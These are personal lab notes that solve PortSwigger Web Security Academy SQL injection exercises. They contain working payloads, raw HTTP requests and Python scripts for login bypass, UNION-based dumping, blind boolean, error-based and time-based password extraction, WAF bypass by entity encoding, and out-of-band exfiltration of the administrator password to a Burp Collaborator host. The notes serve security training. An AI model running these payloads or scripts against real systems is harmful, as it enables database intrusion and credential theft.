# SQL Injection

## SQL injection vulnerability allowing login bypass
- Navigate to `My account` page
- Use `administrator'--+` as username
- Use `randomstring` for password.
- Login

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```text
https://my.web-security-academy.net/filter?category=Accessories' OR '1'='1'--+
```

## Blind SQL injection with out-of-band data exfiltration

Looking at the materials they said we should use `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--` which is a MSSQL payload.
This won't work in this case so we need to check other SQL types in [[00 - SQL injection cheat sheet]]
   
|   |   |
|---|---|
|Oracle|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`|
|Microsoft|`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`|
|PostgreSQL|`create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`|
|MySQL|The following technique works on Windows only:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

Don't forget to place the payload between `x' UNION` and comment at the end. 
Don't forget to URL encode before hitting Send.

1. Click on "All" categories and intercept the request
2. Start Burp Collaborator and copy the subdomain to clipboard
3. Craft the payload as follows (replace the collaborator subdomain):
```txt
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.69dt7e2d0z5hz1mqm0bze6u6pxvojk79.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
4. Since we know the injection point, just replace the value of the cookie `TrakingId` with the payload and send the request:
```http
GET / HTTP/2
Host: 0aef00a4049a6bc183790fc8005a000c.web-security-academy.net
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.69dt7e2d0z5hz1mqm0bze6u6pxvojk79.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=Bj9cGN26BK7tIB8m9ITJP2xfuxCuYamF
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aef00a4049a6bc183790fc8005a000c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
5. Check Collaborator tab to see if any request was made
6. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab
7. Login as administrator



## Blind SQL injection with out-of-band interaction

Looking at the materials they said we should use `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--` which is a MSSQL payload.
This won't work in this case so we need to check other SQL types in [[00 - SQL injection cheat sheet]]

|   |   |
|---|---|
|Oracle|([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL|The following techniques work on Windows only:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

Don't forget to place the payload between `x' UNION` and comment at the end. 
Don't forget to URL encode before hitting Send.

1. Click on "All" categories and intercept the request
2. Start Burp Collaborator and copy the subdomain to clipboard
3. Craft the payload as follows (replace the collaborator subdomain):
 
```txt
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//69dt7e2d0z5hz1mqm0bze6u6pxvojk79.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
4. Since we know the injection point, just replace the value of the cookie `TrakingId` with the payload and send the request:
```txt
GET / HTTP/2
Host: 0ab8007f04596be5836a0081003e0085.web-security-academy.net
Cookie: session=Tdt8YL9prnrLFRXe8N6qQwo1qJWYTUdu; TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//69dt7e2d0z5hz1mqm0bze6u6pxvojk79.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab8007f04596be5836a0081003e0085.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
5. Check Collaborator tab to see if any DNS request was made


## Blind SQL injection with conditional errors


##### Python Script
>[!NOTE] 
> This script needs to get parametrized.
> But leave the original one for reference

```text
# Building the payload
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a


Oracle	SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft	SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END
PostgreSQL	1 = (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
MySQL	SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')


' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)='a        # BINGO!
' AND (1 = (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS INTEGER) ELSE NULL END))='a
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a'))='a
```

```python
import requests
import string
from requests.exceptions import HTTPError

keyword = "Internal Server Error"
found = True
password = "PASSWORD: "

print ("SCRIPT STARTED!")
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
for i in range(1,50):
    if found == True:
        found = False
        for val in characters:
            # print(val)
            try:
                trackID = "Njc1oJKpDbubWJg0\' AND (SELECT CASE WHEN (Username = \'administrator\' AND SUBSTR(Password, {}, 1) = \'{}\') THEN TO_CHAR(1/0) ELSE \'a\' END FROM users WHERE username='administrator')='a".format(i,val)
                # print(trackID)
                response = requests.get(
                           'https://my.web-security-academy.net/',
                           params={'q': 'requests+language:python'},
                           headers={"Host": "my.web-security-academy.net",
                                    "Cookie": "TrackingId={}; session=q0teTs0kcCrjnX3tNFJZm9HcpX3JBG4X".format(trackID),
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                    "Accept-Language": "en-US,en;q=0.5",
                                    "Accept-Encoding": "gzip, deflate",
                                    "Referer": "https://my.web-security-academy.net/",
                                    "Upgrade-Insecure-Requests": "1",
                                    "Sec-Fetch-Dest": "document",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-User": "?1",
                                    "Te": "trailers",
                                    "Connection": "close"},)
                print
                # If the response was successful, no Exception will be raised
                response.raise_for_status()
            except HTTPError as http_err:
                print(f'HTTP error occurred: {http_err}')  # Python 3.6
                print(response.status_code)
                if keyword in response.text:
                    password = password + val
                    print(password)
                    found = True
                    break
            except Exception as err:
                print(f'Other error occurred: {err}')  # Python 3.6
            # else:
                # print('Success!')
print
print ("DONE")
```

## Blind SQL injection with conditional responses


##### Python Script
>[!NOTE] 
> This script needs to get parametrized
> But leave the original one for reference

```python
import requests
import string
from requests.exceptions import HTTPError

keyword = "Welcome back!"
found = True
password = "PASSWORD: "

print ("SCRIPT STARTED!")
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
for i in range(1,50):
    if found == True:
        found = False
        for val in characters:
            # print(val)
            try:
                trackID = "jTPRv01F1ZA4ZSMf\'+AND+SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), {}, 1) = '{}".format(i,val)
                # print(trackID)
                response = requests.get(
                           'https://my.web-security-academy.net/',
                           params={'q': 'requests+language:python'},
                           headers={"Host": "my.web-security-academy.net",
                                    "Cookie": "TrackingId={}; session=c5l82M2xMdAOMfqRS7kHE0roxnZfIztb".format(trackID),
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                    "Accept-Language": "en-US,en;q=0.5",
                                    "Accept-Encoding": "gzip, deflate",
                                    "Referer": "https://my.web-security-academy.net/",
                                    "Upgrade-Insecure-Requests": "1",
                                    "Sec-Fetch-Dest": "document",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-User": "?1",
                                    "Te": "trailers",
                                    "Connection": "close"},)
                print
                # If the response was successful, no Exception will be raised
                response.raise_for_status()
            except HTTPError as http_err:
                print(f'HTTP error occurred: {http_err}')  # Python 3.6
            except Exception as err:
                print(f'Other error occurred: {err}')  # Python 3.6
            else:
                # print('Success!')
                # print(response.content)
                # print(response.text)
                # print(response.encoding)
                # print(response.headers)
                # print(response.status_code)
                # print(len(response.content))
                # print(response.request.headers)
                if keyword in response.text:
                    password = password + val
                    print (password)
                    found = True
                    break
                # else:
                    # print("NOT FOUND")
print
print ("DONE")
```

## Blind SQL injection with time delays

```text
'; SELECT pg_sleep(10)--
# REMEMBER TO URL ENCODE ;
```

## Blind SQL injection with time delays and information retrieval

As in previous we check which SQL is used 
```text
'; SELECT pg_sleep(10)--
# REMEMBER TO URL ENCODE ;
# Building process:
'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--
'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
'%3b SELECT CASE WHEN (SUBSTRING('aca',a,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
'%3b SELECT CASE WHEN (SUBSTRING(Password,1,1)>'1') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

```python
import requests
import string
from requests.exceptions import HTTPError

found = True
password = "PASSWORD: "

print ("SCRIPT STARTED!")
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
# characters = ["a","b"]
for i in range(1,50):
    if found == True:
        found = False
        for val in characters:
            # print(val)
            try:
                trackID = "wUOot3T2dSBtaC8I'%3b SELECT CASE WHEN (SUBSTRING(Password,{},1)='{}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--".format(i,val)
                # ".format(i,val)
                # print(trackID)
                response = requests.get(
                           'https://my.web-security-academy.net/',
                           params={'q': 'requests+language:python'},
                           headers={"Host": "my.web-security-academy.net",
                                    "Cookie": "TrackingId={}; session=Gpsue4gnuDyAAs7FqGa3WXM69NV1U2Qd".format(trackID),
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                    "Accept-Language": "en-US,en;q=0.5",
                                    "Accept-Encoding": "gzip, deflate", 
                                    "Referer": "https://my.web-security-academy.net/",
                                    "Upgrade-Insecure-Requests": "1",
                                    "Sec-Fetch-Dest": "document",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-User": "?1",
                                    "Te": "trailers",
                                    "Connection": "close"},)
                print
                # If the response was successful, no Exception will be raised
                response.raise_for_status()
            except HTTPError as http_err:
                print(f'HTTP error occurred: {http_err}')  # Python 3.6
            except Exception as err:
                print(f'Other error occurred: {err}')  # Python 3.6
            else:
                # print('Success!')
                # print(response.elapsed)
                # print(response.elapsed.total_seconds())
                # print(response.content)
                # print(response.text)
                # print(response.encoding)
                # print(response.headers)
                # print(response.status_code)
                # print(len(response.content))
                # print(response.request.headers)
                if response.elapsed.total_seconds() > 3:
                     password = password + val
                     print (password)
                     found = True
                     break
                # else:
                    # print("NOT FOUND")
print
print ("DONE")
```

## SQL injection attack, listing the database contents on non-Oracle databases


1. Intercept request for listing a specific category and check if the `category` parameter is vulnerable to SQLi
```txt
GET /filter?category=Pets' HTTP/2
```
2. Determine the number of columns used by query and data type by modifying the payload
```txt
GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL-- HTTP/2
```
3. Retrive tables name
```txt
GET /filter?category=Pets'+UNION+SELECT+TABLE_NAME,+NULL+FROM+information_schema.tables-- HTTP/2
```
4. Retrieve table columns (we are interested in table containing user info `users_zbiwdu`)
```txt
GET /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+information_schema.columns+WHERE+TABLE_NAME='users_zbiwdu'-- HTTP/2
```
5. Retrieve data (columns `username_dlfcuq` and `password_vfvgpg`)
```txt
GET /filter?category=Pets'+UNION+SELECT+password_vfvgpg,+NULL+FROM+users_zbiwdu+WHERE+username_dlfcuq='administrator'-- HTTP/2
```

## SQL injection attack, listing the database contents on Oracle


1. Intercept request for listing a specific category and check if the `category` parameter is vulnerable to SQLi
```txt
GET /filter?category=Gifts' HTTP/2
```
2. Determine the number of columns used by query and data type by modifying the payload
```txt
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+dual-- HTTP/2
```
3. Retrive tables name
```txt
GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
```
4. Retrieve table columns (we are interested in table containing user info `USERS_JVYYLP`)
```txt
GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_JVYYLP'-- HTTP/2
```
5. Retrieve data (columns `USERNAME_NSWIGJ` and `PASSWORD_CQIELV`)
```txt
GET /filter?category=Gifts'+UNION+SELECT+PASSWORD_CQIELV,+NULL+FROM+USERS_JVYYLP+WHERE+USERNAME_NSWIGJ='administrator'-- HTTP/2
```

>[!NOTE:]
>On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
>There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

## SQL injection attack, querying the database type and version on MySQL and Microsoft


1. Intercept request for listing a specific category and check if the `category` parameter is vulnerable to SQLi
```txt
GET /filter?category=Lifestyle' HTTP/2
```
2. Determine the number of columns used by query and data type by modifying the payload
```txt
GET /filter?category=Lifestyle'+UNION+SELECT+NULL,+NULL# HTTP/2
```
3. Determine Microsoft DB version
```txt
GET /filter?category=Lifestyle'+UNION+SELECT+@@version,+NULL# HTTP/2
```

## SQL injection attack, querying the database type and version on Oracle


1. Intercept request for listing a specific category and check if the `category` parameter is vulnerable to SQLi
```txt
GET /filter?category=Lifestyle' HTTP/2
```
2. Determine the number of columns used by query and data type by modifying the payload
```txt
GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL+FROM+dual-- HTTP/2
GET /filter?category=Lifestyle'+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/2
```
3. Determine Oracle DB version
```txt
GET /filter?category=Lifestyle+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
```

>[!NOTE:]
>On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
>There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

## SQL injection UNION attack, determining the number of columns returned by the query


```text
https://my.web-security-academy.net/filter?category=Pets' ORDER BY 4--+
```
Gives us an error

But
```text
https://my.web-security-academy.net/filter?category=Pets' ORDER BY 3--+
```
Displays the page properly. That means we have 3 columns in SELECT.

Which means we can also use 
```text
https://my.web-security-academy.net/filter?category=Pets' UNION SELECT null,null,null--+
```

## SQL injection UNION attack, finding a column containing text


```text
https://my.web-security-academy.net/filter?category=Pets' UNION SELECT 'a',null,null--+
```
This one errors so we cannot use the first one.

```text
https://my.web-security-academy.net/filter?category=Pets' UNION SELECT null,'a',null--+
```
This one works

But this one
```text
https://my.web-security-academy.net/filter?category=Pets' UNION SELECT null,'a','a'--+
```
also errors out.

To solve the lab replace `a` with requested string.

## SQL injection UNION attack, retrieving data from other tables

**Step 1:** Find the number of columns
```text
https://my.web-security-academy.net/filter?category=Pets' ORDER BY 2--+
```

**Step 2:** Check which column can be used to retrieve data
```text
https://my.web-security-academy.net/filter?category=Pets' UNION SELECT 'a','b'--+
```
Both can. Great
We already know the table name and columns names.

* Step 3: **
```text
https://my.web-security-academy.net/filter?category=Pets' UNION SELECT username, password FROM users--+
```

**Step 4:**
Login as Administrator using retrieved data.

## SQL injection UNION attack, retrieving multiple values in a single column

**Step 1:**
```text
' ORDER BY 2--+
```

**Step 2:**
```text
' UNION SELECT 'a',null--+ # DOES NOT WORK
' UNION SELECT null,'a'--+ # WORKS!
```

**Step 3:**
```text
' UNION SELECT null, username || '~' || password FROM users--+
or
' UNION SELECT null, CONCAT(username,'~',password) FROM users--+
```

**Step 4:** Login as Administrator with retrieved password.

## SQL injection with filter bypass via XML encoding



1. Click on a product and check stock, intercept the request and send it to Repeater
2. Try to add an apostrophe after `productId` or `storeId` and you will get `"Attack detected"` meaning a WAF preventing basic SQLi payloads
3. Try to encode the values of the tags; **use HTML (hex entities)**
4. With WAF bypassed we can check both tags again with a union payload added after existent values like:
```txt
Raw:
2 UNION SELECT NULL

NCR Hex encoded:
&#x32;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
```
5. We can see that `storeId` tag is vulnerable and the UNION query it reveals one column
6. In this case we can build a query to concatenated multiple values and return them in one data field assuming the table and column name are the standard ones (plus a dash as a separator):
```txt
Raw:
2 UNION SELECT username || '-' || password FROM users

Hex encoded:
&#x32;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x2d;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;

Note: No spaces
This will not work
&#x32; &#x20; &#x55; &#x4e; &#x49; &#x4f; &#x4e; &#x20; &#x53; &#x45; &#x4c; &#x45; &#x43; &#x54; &#x20; &#x75; &#x73; &#x65; &#x72; &#x6e; &#x61; &#x6d; &#x65; &#x20; &#x7c; &#x7c; &#x20; &#x27; &#x2d; &#x27; &#x20; &#x7c; &#x7c; &#x20; &#x70; &#x61; &#x73; &#x73; &#x77; &#x6f; &#x72; &#x64; &#x20; &#x46; &#x52; &#x4f; &#x4d; &#x20; &#x75; &#x73; &#x65; &#x72; &#x73;
```
7. The response will return all the users and passwords from DB table users, separated by a dash
8. Login as administrator to finish the lab

NCR Decimal will also work
```text
&#50;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#45;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;
```


## Visible error-based SQL injection


- Open the web site and open any of the products (or navigate to any other page it does not matter)
- Notice `TrackingId` in the Cookie `Cookie: TrackingId=84U29EnfOvCVwMN9; session=zH4RfFdLNzFJeiAIOMSR1D0mX8yfZP7i`
- Change the value to `84U29EnfOvCVwMN9'` and observe message in response 
```html
<h4>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '84U29EnfOvCVwMN9''. Expected  char</h4>
<p class=is-warning>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '84U29EnfOvCVwMN9''. Expected  char</p>
```
- Change the value to `84U29EnfOvCVwMN9'--` and observe that the message in response is gone making this a valid request
- Change the value to `84U29EnfOvCVwMN9'--` and observe that the message in response is gone making this a valid request
- Change the value to `84U29EnfOvCVwMN9' AND CAST((SELECT username FROM users) AS int)--` and we get new error
```html
<h4>Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '84U29EnfOvCVwMN9' AND CAST((SELECT username FROM users) AS i'. Expected  char</h4>
<p class=is-warning>Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '84U29EnfOvCVwMN9' AND CAST((SELECT username FROM users) AS i'. Expected  char</p>
```
- Truncate the id to `8' AND CAST((SELECT username FROM users) AS int)--` and we get new error
```html
<h4>ERROR: argument of AND must be type boolean, not type integer
  Position: 43</h4>
<p class=is-warning>ERROR: argument of AND must be type boolean, not type integer
  Position: 43</p>
```
- Change to `8' AND CAST((SELECT username FROM users) AS int)=1--`
```html
<h4>ERROR: more than one row returned by a subquery used as an expression</h4>
<p class=is-warning>ERROR: more than one row returned by a subquery used as an expression</p>
```
- Change to `8' AND CAST((SELECT username FROM users LIMIT 1) AS int)=1--`
```html
<h4>ERROR: invalid input syntax for type integer: "administrator"</h4>
<p class=is-warning>ERROR: invalid input syntax for type integer: "administrator"</p>
```
-We are close, change to `8' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--`
```html
<h4>ERROR: invalid input syntax for type integer: "ckfwi463wi32mmomevhc"</h4>
<p class=is-warning>ERROR: invalid input syntax for type integer: "ckfwi463wi32mmomevhc"</p>
```
- Login with `administrator:ckfwi463wi32mmomevhc`

